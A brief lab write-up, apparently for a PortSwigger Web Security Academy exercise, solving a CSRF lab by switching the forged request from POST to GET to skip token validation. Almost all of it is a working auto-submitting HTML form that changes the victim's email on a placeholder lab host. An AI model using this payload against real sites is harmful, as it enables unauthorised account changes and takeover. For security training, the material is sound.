# [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

> goal is to send a `get` method instead of a `post`

```
<body>
  <script>
    const form = document.createElement("form");
    const email = document.createElement("input");
    email.name = "email";
    email.value = "duck@quack";
    form.method = "get";
    form.action =
      "https://xxx.web-security-academy.net/my-account/change-email";
    form.append(email);
    document.body.append(form);
    form.submit();
  </script>
</body>
```
